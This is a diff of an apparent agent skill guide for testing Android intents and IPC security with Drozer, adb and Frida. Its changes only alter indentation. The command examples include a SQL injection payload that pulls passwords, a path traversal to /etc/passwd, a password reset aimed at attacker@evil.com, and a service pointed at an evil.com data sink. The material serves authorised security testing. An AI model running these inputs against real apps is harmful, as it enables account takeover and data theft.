@@ -1,13 +1,13 @@
 ---
 name: testing-android-intents-for-vulnerabilities
 description: 'Tests Android inter-process communication (IPC) through intents for
-  vulnerabilities including intent injection, unauthorized component access, broadcast
-  sniffing, pending intent hijacking, and content provider data leakage. Use when
-  assessing Android app attack surface through exported components, testing intent-based
-  data flows, or evaluating IPC security. Activates for requests involving Android
-  intent security, IPC testing, exported component analysis, or Drozer assessment.
+ vulnerabilities including intent injection, unauthorized component access, broadcast
+ sniffing, pending intent hijacking, and content provider data leakage. Use when
+ assessing Android app attack surface through exported components, testing intent-based
+ data flows, or evaluating IPC security. Activates for requests involving Android
+ intent security, IPC testing, exported component analysis, or Drozer assessment.
 
-  '
+ '
 domain: cybersecurity
 subdomain: mobile-security
 author: mahipal
@@ -89,11 +89,11 @@ run app.activity.start --component com.target.app com.target.app.AdminActivity
 
 # Launch with intent extras
 run app.activity.start --component com.target.app com.target.app.ProfileActivity \
-  --extra string user_id 1337
+ --extra string user_id 1337
 
 # Test intent injection via data URI
 adb shell am start -a android.intent.action.VIEW \
-  -d "content://com.target.app/users/admin" com.target.app
+ -d "content://com.target.app/users/admin" com.target.app
 
 # If admin activity opens without auth, report as authorization bypass
 ```
@@ -103,14 +103,14 @@ adb shell am start -a android.intent.action.VIEW \
 ```bash
 # Send broadcast to exported receivers
 run app.broadcast.send --action com.target.app.PROCESS_PAYMENT \
-  --extra string amount "0.01" --extra string recipient "attacker"
+ --extra string amount "0.01" --extra string recipient "attacker"
 
 # Sniff broadcasts for sensitive data
 run app.broadcast.sniff --action com.target.app.USER_LOGIN
 
 # Via ADB
 adb shell am broadcast -a com.target.app.RESET_PASSWORD \
-  --es email "attacker@evil.com"
+ --es email "attacker@evil.com"
 ```
 
 ### Step 4: Test Content Providers
@@ -122,7 +122,7 @@ run app.provider.query content://com.target.app.provider/users --projection "pas
 
 # Test SQL injection in content providers
 run app.provider.query content://com.target.app.provider/users \
-  --selection "1=1) UNION SELECT username,password FROM users--"
+ --selection "1=1) UNION SELECT username,password FROM users--"
 
 # Test path traversal
 run app.provider.read content://com.target.app.provider/../../etc/passwd
@@ -138,22 +138,22 @@ run scanner.provider.traversal -a com.target.app
 ```javascript
 // Monitor PendingIntent creation via Frida
 Java.perform(function() {
-    var PendingIntent = Java.use("android.app.PendingIntent");
+ var PendingIntent = Java.use("android.app.PendingIntent");
 
-    PendingIntent.getActivity.overload("android.content.Context", "int",
-        "android.content.Intent", "int").implementation =
-        function(context, requestCode, intent, flags) {
-            console.log("[PendingIntent] getActivity:");
-            console.log("  Intent: " + intent.toString());
-            console.log("  Flags: " + flags);
+ PendingIntent.getActivity.overload("android.content.Context", "int",
+ "android.content.Intent", "int").implementation =
+ function(context, requestCode, intent, flags) {
+ console.log("[PendingIntent] getActivity:");
+ console.log(" Intent: " + intent.toString());
+ console.log(" Flags: " + flags);
 
-            // Check for FLAG_IMMUTABLE (secure) vs FLAG_MUTABLE (vulnerable)
-            var FLAG_MUTABLE = 0x02000000;
-            if ((flags & FLAG_MUTABLE) !== 0) {
-                console.log("  [VULN] FLAG_MUTABLE - PendingIntent can be modified by receiver");
-            }
-            return this.getActivity(context, requestCode, intent, flags);
-        };
+ // Check for FLAG_IMMUTABLE (secure) vs FLAG_MUTABLE (vulnerable)
+ var FLAG_MUTABLE = 0x02000000;
+ if ((flags & FLAG_MUTABLE) !== 0) {
+ console.log(" [VULN] FLAG_MUTABLE - PendingIntent can be modified by receiver");
+ }
+ return this.getActivity(context, requestCode, intent, flags);
+ };
 });
 ```
 
@@ -162,10 +162,10 @@ Java.perform(function() {
 ```bash
 # Attempt to bind to exported services
 run app.service.start --action com.target.app.SYNC_SERVICE \
-  --extra string server "https://evil.com/data_sink"
+ --extra string server "https://evil.com/data_sink"
 
 run app.service.send com.target.app com.target.app.MessengerService \
-  --msg 1 0 0 --extra string command "dump_database" --bundle-as-obj
+ --msg 1 0 0 --extra string command "dump_database" --bundle-as-obj
 ```
 
 ## Key Concepts
